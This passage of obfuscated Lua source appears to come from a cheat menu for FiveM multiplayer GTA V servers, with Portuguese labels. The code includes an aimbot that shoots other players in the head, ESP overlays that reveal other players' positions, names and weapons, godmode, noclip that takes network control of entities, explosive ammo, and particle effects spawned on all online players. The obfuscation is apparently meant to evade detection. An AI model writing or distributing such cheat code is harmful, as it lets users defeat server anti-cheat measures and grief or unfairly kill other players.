            esp_veiculo_cor = {r = ra.r, g = ra.b, b = ra.g}
        end
            

        if buniza and IsPedInAnyVehicle(PlayerPedId(-1), vitolasRPMQCUeMEUCUzz) then
            if IsControlPressed(1, 38) then
                Citizen.InvokeNative(0xAB54A438726D25D5, GetVehiclePedIsUsing(PlayerPedId(-1)), 50 + 0.0)
            end
        end
        if rolasinf then
            for i = 0, 3 do
                StatSetInt(vitolasRPMQCUeMEUCUff("mp" .. i .. "_shooting_ability"), 9999, vitolasRPMQCUeMEUCUzz)
                StatSetInt(vitolasRPMQCUeMEUCUff("sp" .. i .. "_shooting_ability"), 9999, vitolasRPMQCUeMEUCUzz)
            end
        else
            for i = 0, 3 do
                StatSetInt(vitolasRPMQCUeMEUCUff("mp" .. i .. "_shooting_ability"), 0, vitolasRPMQCUeMEUCUzz)
                StatSetInt(vitolasRPMQCUeMEUCUff("sp" .. i .. "_shooting_ability"), 0, vitolasRPMQCUeMEUCUzz)
            end
        end

        local function L(M, N)
            return vector3(M.x + N.x, M.y + N.y, M.z + N.z)
        end
        local function O(P, bone, Q)
            local S = GetPedBoneCoords(P, GetEntityBoneIndexByName(P, "SKEL_HEAD"), 0.0, 0.0, 0.0)
            local T, U = GetCurrentPedWeapon(PlayerPedId())
            ShootSingleBulletBetweenCoords(
                L(S, vector3(0, 0, 0.1)),
                S,
                Q,
                vitolasRPMQCUeMEUCUzz,
                U,
                PlayerPedId(),
                vitolasRPMQCUeMEUCUzz,
                vitolasRPMQCUeMEUCUzz,
                1000.0
            )
        end
        local function bD(H)
            if
                IsEntityOnScreen(H) and HasEntityClearLosToEntityInFront(PlayerPedId(), H) and
                    not IsPedDeadOrDying(H) and
                    not IsPedInVehicle(H, GetVehiclePedIsIn(H), admgordolas) and
                    IsDisabledControlPressed(0, 24) and
                    IsPlayerFreeAiming(PlayerId())
             then
                local x, y, z = table.unpack(GetEntityCoords(H))
                local T, _x, _y = World3dToScreen2d(x, y, z)
                if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
                    local T, U = GetCurrentPedWeapon(PlayerPedId())
                    O(H, "", GetWeaponDamage(U, 0))
                end
            end
        end
if stamina then
    RestorePlayerStamina(PlayerId(), 1.0)
end

if BecomeTiny then
    SetPedConfigFlag(PlayerPedId(), 223)
  else
    SetPedConfigFlag(PlayerPedId(), 223)
  end


if correrSpeed then
    SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
    SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
  else
    SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
    SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
  end

if FireBreath and not IsPedInAnyVehicle(GetPlayerPed(-1)) then
   
    ShowInfo("🔥~w~Aperte ~r~2 ~w~Para Soltar Fogo!🔥")
    if IsControlPressed(1, 158) then
      RequestNamedPtfxAsset("core")
    UseParticleFxAssetNextCall("core")
    StartNetworkedParticleFxNonLoopedOnEntity("ent_sht_flame", GetPlayerPed(-1), 0.0, 0.350, 0.6, 0.0, 90.0, 90.0, 1.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed2)
    end
  end

if Godmode then
    SetPedSuffersCriticalHits(PlayerPedId(), admgordolas)
    if GetEntityHealth(PlayerPedId()) < 400 then
    SetEntityHealth(PlayerPedId(), 400)
    end
    if GetEntityHealth(PlayerPedId()) ~= 0 then
    end
    else
    SetPedSuffersCriticalHits(PlayerPedId(), vitolasRPMQCUeMEUCUzz)
end

if coloridin then 
    ra = RGBRainbow(1.0)
    SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
    SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
end

if rgbmenu then
    ra = RGBRainbow(1.3)
    menucolor= { r = ra.r, g = ra.b, b = ra.g }

end

if ExplosiveAmmo then
    local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
    if ret then
        AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
    end
end

if Nocrip then
    local NoclipSpeed = 0.3
    local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
    local k = vitolasRPMQCUeMEUCUss
    local x, y, z = vitolasRPMQCUeMEUCUss
    if not isInVehicle then
        k = PlayerPedId()
        x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
    else
        k = GetVehiclePedIsIn(PlayerPedId(), 0)
        x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
    end
    if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then
        RequestControlOnce(k)
    end
    local dx, dy, dz = GetCamDirection()
    SetEntityVisible(PlayerPedId(), 0, 0)
    SetEntityVisible(k, 0, 0)
    SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
    if Citizen.InvokeNative(0xE2587F8CBBD87B1D, 0, keys["LEFTSHIFT"]) then -- Change speed
        NoclipSpeed = NoclipSpeed * 0.9
    end
    if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
        x = x + NoclipSpeed * dx
        y = y + NoclipSpeed * dy
        z = z + NoclipSpeed * dz
    end
    if IsDisabledControlPressed(0, 269) then -- MOVE BACK
        x = x - NoclipSpeed * dx
        y = y - NoclipSpeed * dy
        z = z - NoclipSpeed * dz
    end
    if IsDisabledControlPressed(0, keys["SPACE"]) then -- MOVE UP
        z = z + NoclipSpeed
    end
    if IsDisabledControlPressed(0, keys["LEFTCTRL"]) then -- MOVE DOWN
        z = z - NoclipSpeed
    end
    SetEntityCoordsNoOffset(k, x, y, z, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
end
function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return vitolasRPMQCUeMEUCUzz
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), vitolasRPMQCUeMEUCUzz)
    return NetworkRequestControlOfEntity(entity)
end

if skeleton then
    local cS = GetActivePlayers()
    for l = 1, #cS do
    local c1 = cS[l]
    if c1 ~= PlayerId() and GetPlayerServerId(c1) ~= 0 then
    local d7 = GetEntityCoords(GetPlayerPed(cS[l]))
    local d8 = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), d7)
    local d9 = 300.0
    if d8 <= d9 then
    local T, dx = GetCurrentPedWeapon(GetPlayerPed(cS[l]), 1)
    local dy = bu(dx)
    if dy == nil then
    dy = "Nenhuma"
    end
    local da = GetPlayerPed(c1)
    local db, dc, dd = table.unpack(GetEntityCoords(PlayerPedId()))
    local x, y, z = table.unpack(GetEntityCoords(da))
    local d6 = "Arma : " .. dy .. " "
    local de = IsPlayerDead(da)
    if GetEntityHealth(da) <= 0 then
    de = true
    end
    if de then
    d6 = " "
    end
    if dy == "DESARMADO" then
    d6 = " "
    end
    bw(x, y, z + 0.1, d6, 255, 255, 255)
    end
    end
    end
    end

    function bu(bv)
    for l = 1, #bt do
    if GetHashKey(bt[l]) == bv then
    return string.sub(bt[l], 8)
    end
    end
    end

    function bw(x, y, z, m, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0, 0.19)
    SetTextColour(255, 255, 255, 255)
    SetTextOutline()
    BeginTextCommandDisplayText("STRING")
    SetTextCentre(1)
    AddTextComponentSubstringPlayerName(m)
    EndTextCommandDisplayText(0.0, 0.0)
    ClearDrawOrigin()
    end

if espveiculo then
    for vehicle in EnumerateVehicles() do
        local x, y, z = table.unpack(GetEntityCoords(vehicle))
        local _, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
        local x1, y1, z1 = table.unpack(GetEntityCoords(PlayerPedId()))
        local dist =
            tonumber(string.format("%.1f", GetDistanceBetweenCoords(x1, y1, z1, x, y, z, bypasszinhazz)))
        local string = "" .. GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)) .. " (" .. dist .. "m)"
        if dist < visuals_distance.value + 0.0 then
            drawTextOutline(
                string,
                _x,
                _y,
                0.27,
                10,
                vitolasRPMQCUeMEUCUzz,
                vitolasRPMQCUeMEUCUzz,
                esp_veiculo_cor.r, esp_veiculo_cor.g, esp_veiculo_cor.b
            )
        end
    end
end

if espskel then
    for k, v in pairs(GetActivePlayers()) do
        local ped = GetPlayerPed(v)
        local Pped = PlayerPedId()
        er = PlayerPedId()
        if GetDistanceBetweenCoords(GetEntityCoords(ped), GetEntityCoords(PlayerPedId()), patogostosobypasszz) < visuals_distance.value + 0.0 and ped ~= er then
            DrawLine(Dz(ped, 31086, 0.0, 0.0, 0.0),Dz(ped, 0x9995, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x9995, 0.0, 0.0, 0.0),Dz(ped, 0xE0FD, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x5C57, 0.0, 0.0, 0.0),Dz(ped, 0xE0FD, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x192A, 0.0, 0.0, 0.0),Dz(ped, 0xE0FD, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x3FCF, 0.0, 0.0, 0.0),Dz(ped, 0x192A, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0xCC4D, 0.0, 0.0, 0.0),Dz(ped, 0x3FCF, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0xB3FE, 0.0, 0.0, 0.0),Dz(ped, 0x5C57, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0xB3FE, 0.0, 0.0, 0.0),Dz(ped, 0x3779, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x9995, 0.0, 0.0, 0.0),Dz(ped, 0xB1C5, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0xB1C5, 0.0, 0.0, 0.0),Dz(ped, 0xEEEB, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0xEEEB, 0.0, 0.0, 0.0),Dz(ped, 0x49D9, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x9995, 0.0, 0.0, 0.0),Dz(ped, 0x9D4D, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x9D4D, 0.0, 0.0, 0.0),Dz(ped, 0x6E5C, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
            DrawLine(Dz(ped, 0x6E5C, 0.0, 0.0, 0.0),Dz(ped, 0xDEAD, 0.0, 0.0, 0.0),esp_skel_cor.r, esp_skel_cor.g, esp_skel_cor.b, 255)
        end
    end 
end
GetPedBoneCoordsF = function(ped, boneId)
    local cam = GetFinalRenderedCamCoord()
    local ret, coords, shape = GetShapeTestResult(
        StartShapeTestRay(
            vector3(cam), vector3(GetPedBoneCoords(ped, 0x0)), -1
        )
    )
    if coords then 
        a = Vdist(cam, shape)/Vdist(cam, GetPedBoneCoords(ped, 0x0)) 
    else
        a = 0.83 
    end
    if a > 1 then 
        a = 0.83 
    end
    if ret then
        return (((GetPedBoneCoords(ped, boneId)-cam)*((a) * 0.83)) + cam)
    end
end

if box then
    for an in EnumeratePeds() do
        local d4, d5 = GetActiveScreenResolution()
        local cC = GetEntityCoords(an)
        me = an ~= PlayerPedId()
        mr = IsPedAPlayer(an)
        local cD = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), cC.x, cC.y, cC.z, patogostosobypasszz) * (1.1 - 0.05)
        local dB = GetPedArmour(an) * 10.76200
        local aK = GetEntityHealth(an) * 5.38200
        local dC = 1250
        local dD = 1200
        if IsEntityOnScreen(an) then
            if cD < visuals_distance.value + 0.0 then
                if me and mr and not IsEntityDead(an) then
                    SetDrawOrigin(cC.x, cC.y, cC.z, 0)
                    DrawRect(0.0, 0.0, 1075.2 / d4 / cD, 2376 / d5 / cD, 0, 0, 0, 90)
                    if HasEntityClearLosToEntity(PlayerPedId(), an, 19) then
                        local r, g, b = esp_box_cor.r, esp_box_cor.g, esp_box_cor.b
                        DrawRect(-537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        DrawRect(-537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        DrawRect(537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        DrawRect(537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        DrawRect(
                        (290 + 150 / 2) / d4 / cD,
                        1190.6 / d5 / cD,
                        350 / d4 / cD,
                        1 / d5,
                        r,
                        g,
                        b,
                        255
                    )
                    DrawRect(
                    (-290 - 150 / 2) / d4 / cD,
                    1190.6 / d5 / cD,
                    350 / d4 / cD,
                    1 / d5,
                    r,
                    g,
                    b,
                    255
                )
                DrawRect(
                (290 + 150 / 2) / d4 / cD,
                -1190.6 / d5 / cD,
                350 / d4 / cD,
                1 / d5,
                r,
                g,
                b,
                255
            )
            DrawRect(
            (-290 - 150 / 2) / d4 / cD,
            -1190.6 / d5 / cD,
            350 / d4 / cD,
            1 / d5,
            r,
            g,
            b,
            255
        )
    else
        local r, g, b = 255, 0, 0
        DrawRect(-537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
        DrawRect(-537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
        DrawRect(537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
        DrawRect(537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
        DrawRect(
        (290 + 150 / 2) / d4 / cD,
        1190.6 / d5 / cD,
        350 / d4 / cD,
        1 / d5,
        r,
        g,
        b,
        255
    )
    DrawRect(
    (-290 - 150 / 2) / d4 / cD,
    1190.6 / d5 / cD,
    350 / d4 / cD,
    1 / d5,
    r,
    g,
    b,
    255
)
DrawRect(
(290 + 150 / 2) / d4 / cD,
-1190.6 / d5 / cD,
350 / d4 / cD,
1 / d5,
r,
g,
b,
255
)
DrawRect(
(-290 - 150 / 2) / d4 / cD,
-1190.6 / d5 / cD,
350 / d4 / cD,
1 / d5,
r,
g,
b,
255
)
end
if GetPedArmour(an) == 0 then
    r, g, b = 75, 141 - (50 - GetPedArmour(an)), 173 - (100 - GetPedArmour(an))
else
    r, g, b = 0, 178, 255
end
DrawRect(
-1078.2 / 2 / d4 / cD + dB / 2 / d4 / cD,
dC / d5 / cD + cD / 400 / cD,
dB / d4 / cD,
3 / d5,
r,
g,
b,
255
)
DrawRect(
-1078.2 / 2 / d4 / cD + aK / 2 / d4 / cD,
dD / d5 / cD + cD / 400 / cD,
aK / d4 / cD,
3 / d5,
0,
255,
0,
255
)
ClearDrawOrigin()
end
end
end
end
end

function bu(bv)
for l = 1, #bt do
if vitolasRPMQCUeMEUCUff(bt[l]) == bv then
return string.sub(bt[l], 8)
end
end
end

function bw(x, y, z, m, r, g, b)
SetDrawOrigin(x, y, z, 0)
SetTextFont(0)
SetTextProportional(0)
SetTextScale(0.0, 0.22)
SetTextColour(255, 0, 255, 255)
SetTextOutline()
BeginTextCommandDisplayText("STRING")
SetTextCentre(1)
AddTextComponentSubstringPlayerName(m)
EndTextCommandDisplayText(0.0, 0.0)
ClearDrawOrigin()
end      
function vitolasRPMQCUeMEUCUyy3DD(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    EndTextCommandDisplayText(0.0, 0.0)
    ClearDrawOrigin()
end
function bY(x, y, z, b7, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(300)
    SetTextScale(0.0, 0.20)
    SetTextColour(esp_nome_cor.r, esp_nome_cor.g, esp_nome_cor.b, 255)
    SetTextOutline()
    BeginTextCommandDisplayText("STRING")
    SetTextCentre(1)
    AddTextComponentSubstringPlayerName(b7)
    EndTextCommandDisplayText(0.0, 0.0)
    ClearDrawOrigin()
end

if espdepenis then
    local ds = GetActivePlayers()
    for T = 1, #ds do
    local ct = ds[T]
    if ct ~= PlayerId() and GetPlayerServerId(ct) ~= 0 then
    local dH = GetEntityCoords(GetPlayerPed(ds[T]))
    local dI = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), dH)
    local dJ = visuals_distance.value + 0.0
    if dI <= dJ then
    local dK = GetPlayerPed(ct)
    local dL, dM, dN = table.unpack(GetEntityCoords(PlayerPedId()))
    local x, y, z = table.unpack(GetEntityCoords(dK))
    local dd = "" .. GetPlayerName(ds[T]) .. "  ~w~[" .. math.floor(dI) .. "m]"
    local dO = IsPlayerDead(dK)
    if GetEntityHealth(dK) <= 0 then
    dO = patogostosobypasszz
    end
    if dO then
    dd = " "
    end
    SetTextColour(255, 255,255,255)
    bY(x, y, z - 0.15, dd, 255,255,255)
    end
    end
    end
    end

function Dz(ped, boneId)
    local cam = GetFinalRenderedCamCoord()
    local ret, coords, shape = GetShapeTestResult(
        StartShapeTestRay(
            vector3(cam), vector3(GetPedBoneCoords(ped, 0x0)), -1
        )
    )
    if coords then 
        a = Vdist(cam, shape)/Vdist(cam, GetPedBoneCoords(ped, 0x0)) 
    else
        a = 0.83 
    end
    if a > 1 then 
        a = 0.83 
    end
    if ret then
        return (((GetPedBoneCoords(ped, boneId)-cam)*((a) * 0.83)) + cam)
    end
end



if hfkwebieewdqfogos4 then
    RemoveParticleFx("veh_respray_smoke", 1)
    OnlinePlayers = GetActivePlayers()
    for i = 1, #OnlinePlayers do 

        local ped = GetPlayerPed(OnlinePlayers[i])
        local pedcoords = GetEntityCoords(ped)
        
        RequestNamedPtfxAsset("core")
    
        UseParticleFxAssetNextCall("core")
        StartNetworkedParticleFxNonLoopedAtCoord("veh_respray_smoke", pedcoords, 0.0, 0.0, 0.0, 20.0, admgordolas, admgordolas, admgordolas, admgordolas)
    end
end

if hfkwebieewdqfogos5 then
    RemoveParticleFx("td_blood_shotgun", 1)
    OnlinePlayers = GetActivePlayers()
    for i = 1, #OnlinePlayers do 

        local ped = GetPlayerPed(OnlinePlayers[i])
        local pedcoords = GetEntityCoords(ped)
        
        RequestNamedPtfxAsset("core")
    
        UseParticleFxAssetNextCall("core")
        StartNetworkedParticleFxNonLoopedAtCoord("td_blood_shotgun", pedcoords, 0.0, 0.0, 0.0, 20.0, admgordolas, admgordolas, admgordolas, admgordolas)
    end
end


if hfkwebieewdqfogos6 then
    RemoveParticleFx("veh_backfire", 1)
    OnlinePlayers = GetActivePlayers()
    for i = 1, #OnlinePlayers do 

        local ped = GetPlayerPed(OnlinePlayers[i])
        local pedcoords = GetEntityCoords(ped)
        
        RequestNamedPtfxAsset("core")
    
        UseParticleFxAssetNextCall("core")
        StartNetworkedParticleFxNonLoopedAtCoord("veh_backfire", pedcoords, 0.0, 0.0, 0.0, 20.0, admgordolas, admgordolas, admgordolas, admgordolas)
    end
end


if box then
    for an in EnumeratePeds() do
        local d4, d5 = GetActiveScreenResolution()
        local cC = GetEntityCoords(an)
        me = an ~= PlayerPedId()
        mr = IsPedAPlayer(an)
        local cD = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), cC.x, cC.y, cC.z, vitolasRPMQCUeMEUCUzz) * (1.1 - 0.05)
        local dB = GetPedArmour(an) * 10.76200
        local aK = GetEntityHealth(an) * 5.38200
        local dC = 1250
        local dD = 1200
        if IsEntityOnScreen(an) then
            if cD < 125 then
                if me and mr and not IsEntityDead(an) then
                    SetDrawOrigin(cC.x, cC.y, cC.z, 0)
                    vitolasRPMQCUeMEUCUuu(0.0, 0.0, 1075.2 / d4 / cD, 2376 / d5 / cD, 0, 0, 0, 90)
                    if HasEntityClearLosToEntity(PlayerPedId(), an, 19) then
                        local r, g, b = 255, 255, 255
                        vitolasRPMQCUeMEUCUuu(-537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(-537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(
                            (290 + 150 / 2) / d4 / cD,
                            1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                        vitolasRPMQCUeMEUCUuu(
                            (-290 - 150 / 2) / d4 / cD,
                            1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                        vitolasRPMQCUeMEUCUuu(
                            (290 + 150 / 2) / d4 / cD,
                            -1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                        vitolasRPMQCUeMEUCUuu(
                            (-290 - 150 / 2) / d4 / cD,
                            -1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                    else
                        local r, g, b = 255, 0, 0
                        vitolasRPMQCUeMEUCUuu(-537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(-537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(537.6 / d4 / cD, -935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(537.6 / d4 / cD, 935.6 / d5 / cD, 1 / d4, 500 / d5 / cD, r, g, b, 255)
                        vitolasRPMQCUeMEUCUuu(
                            (290 + 150 / 2) / d4 / cD,
                            1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                        vitolasRPMQCUeMEUCUuu(
                            (-290 - 150 / 2) / d4 / cD,
                            1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                        vitolasRPMQCUeMEUCUuu(
                            (290 + 150 / 2) / d4 / cD,
                            -1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                        vitolasRPMQCUeMEUCUuu(
                            (-290 - 150 / 2) / d4 / cD,
                            -1190.6 / d5 / cD,
                            350 / d4 / cD,
                            1 / d5,
                            r,
                            g,
                            b,
                            255
                        )
                    end
                    if GetPedArmour(an) == 0 then
                        r, g, b = 75, 141 - (50 - GetPedArmour(an)), 173 - (100 - GetPedArmour(an))
                    else
                        r, g, b = 0, 178, 255
                    end
                    vitolasRPMQCUeMEUCUuu(
                        -1078.2 / 2 / d4 / cD + dB / 2 / d4 / cD,
                        dC / d5 / cD + cD / 400 / cD,
                        dB / d4 / cD,
                        3 / d5,
                        r,
                        g,
                        b,
                        255
                    )
                    vitolasRPMQCUeMEUCUuu(
                        -1078.2 / 2 / d4 / cD + aK / 2 / d4 / cD,
                        dD / d5 / cD + cD / 400 / cD,
                        aK / d4 / cD,
                        3 / d5,
                        0,
                        255,
                        0,
                        255
                    )
                    ClearDrawOrigin()
                end
            end
        end
    end

end









if autoreparar then

    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas))
    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0.0)
    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)
    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), admgordolas)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)

end



if SuperJumpRP then
    SetSuperJumpThisFrame(PlayerId(-1))
end

if HornBoost and IsPedInAnyVehicle(PlayerPedId(-1), vitolasRPMQCUeMEUCUzz) then
    if IsControlPressed(1, 38) then
    Citizen.InvokeNative(0xAB54A438726D25D5, GetVehiclePedIsUsing(PlayerPedId(-1)), 80+0.0)
    end
    end
if InfiniteCombatRoll then
for i = 0, 3 do
StatSetInt(vitolasRPMQCUeMEUCUff("mp" .. i .. "_shooting_ability"), 9999, vitolasRPMQCUeMEUCUzz)
StatSetInt(vitolasRPMQCUeMEUCUff("sp" .. i .. "_shooting_ability"), 9999, vitolasRPMQCUeMEUCUzz)
end
else
for i = 0, 3 do
StatSetInt(vitolasRPMQCUeMEUCUff("mp" .. i .. "_shooting_ability"), 0, vitolasRPMQCUeMEUCUzz)
StatSetInt(vitolasRPMQCUeMEUCUff("sp" .. i .. "_shooting_ability"), 0, vitolasRPMQCUeMEUCUzz)
end
end

local function L(M, N)
    return vector3(M.x + N.x, M.y + N.y, M.z + N.z)
end
local function O(P, bone, Q)
    local S = GetPedBoneCoords(P, GetEntityBoneIndexByName(P, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    local T, U = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(L(S, vector3(0, 0, 0.1)), S, Q, vitolasRPMQCUeMEUCUzz, U, PlayerPedId(), vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, 1000.0)
end



local function bD(H)
    if
        IsEntityOnScreen(H) and HasEntityClearLosToEntityInFront(PlayerPedId(), H) and not IsPedDeadOrDying(H) and
            not IsPedInVehicle(H, GetVehiclePedIsIn(H), admgordolas) and
            IsDisabledControlPressed(0, 24) and
            IsPlayerFreeAiming(PlayerId())
     then
        local x, y, z = table.unpack(GetEntityCoords(H))
        local T, _x, _y = World3dToScreen2d(x, y, z)
        if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
            local T, U = GetCurrentPedWeapon(PlayerPedId())
            O(H, "", GetWeaponDamage(U, 0))
        end
    end
end


if aimbot12 then

    local cS = GetActivePlayers()
    for l = 1, #cS do
        bD(GetPlayerPed(cS[l]))
    end


end









function lerp(n, o, p)
    if n > 1 then
        return p
    end
    if n < 0 then
        return o
    end
    return o + (p - o) * n
end
if fovzin then

if not HasStreamedTextureDictLoaded("mpmissmarkers256") then
    RequestStreamedTextureDict("mpmissmarkers256", vitolasRPMQCUeMEUCUzz)
end
DrawSprite("mpmissmarkers256", "corona_shade", 0.5, 0.5, 0.15, 0.15 * 1.8, 0.0, 0, 0, 0, 90)

end 






           





if IsControlJustPressed(1, noclip["Value"]) then
    Nocrip = not Nocrip
    if Nocrip then
        SetEntityVisible(PlayerPedId(), admgordolas, admgordolas)
    else
        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), vitolasRPMQCUeMEUCUzz, admgordolas)
        SetEntityVisible(PlayerPedId(), vitolasRPMQCUeMEUCUzz, admgordolas)
    end
end



        if IsControlJustPressed(1, MQCUumaBOSTA["Value"]) then
            DisplayMenu = not DisplayMenu
        end
        if DisplayMenu  then
            meni()
            kontrols()
            
        end

    end
end)



if IsControlJustPressed(1, MQCUumaBOSTARP["Value"]) then
    DisplayMenu = not DisplayMenu
end
if DisplayMenu  then
    meni()
    kontrols()
    
end












if noclip222 then
    local currentSpeed = 2
    local noclipEntity = IsPedInAnyVehicle(PlayerPedId(), admgordolas) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
    FreezeEntityPosition(PlayerPedId(), vitolasRPMQCUeMEUCUzz)
    SetEntityInvincible(PlayerPedId(), vitolasRPMQCUeMEUCUzz)

    local newPos = GetEntityCoords(entity)

    vitolasRPMQCUeMEUCUgg(0, 32, vitolasRPMQCUeMEUCUzz) --MoveUpOnly
    vitolasRPMQCUeMEUCUgg(0, 268, vitolasRPMQCUeMEUCUzz) --MoveUp

    vitolasRPMQCUeMEUCUgg(0, 31, vitolasRPMQCUeMEUCUzz) --MoveUpDown

    vitolasRPMQCUeMEUCUgg(0, 269, vitolasRPMQCUeMEUCUzz) --MoveDown
    vitolasRPMQCUeMEUCUgg(0, 33, vitolasRPMQCUeMEUCUzz) --MoveDownOnly

    vitolasRPMQCUeMEUCUgg(0, 266, vitolasRPMQCUeMEUCUzz) --MoveLeft
